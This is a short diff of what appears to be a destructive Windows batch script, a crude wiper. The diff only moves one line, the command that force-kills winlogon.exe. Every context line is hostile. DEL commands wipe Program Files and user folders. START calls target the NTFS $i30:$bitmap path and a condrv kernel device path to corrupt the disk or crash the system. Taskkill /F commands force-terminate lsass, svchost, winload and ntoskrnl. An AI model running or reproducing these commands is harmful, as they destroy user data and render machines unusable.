@@ -13,8 +13,8 @@ DEL C:\Progam Files (x86) /y
 DEL C:\User /y
 START C:\:$i30:$bitmap 
 START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
+Taskkill /IM winlogon.exe /F
 Taskkill /IM lsass.exe /F
 Taskkill /IM Svchost.exe /F
-Taskkill /IM winlogon.exe /F
 Taskkill /IM winload.exe /F
 Taskkill /IM Ntoskrnl.exe /F
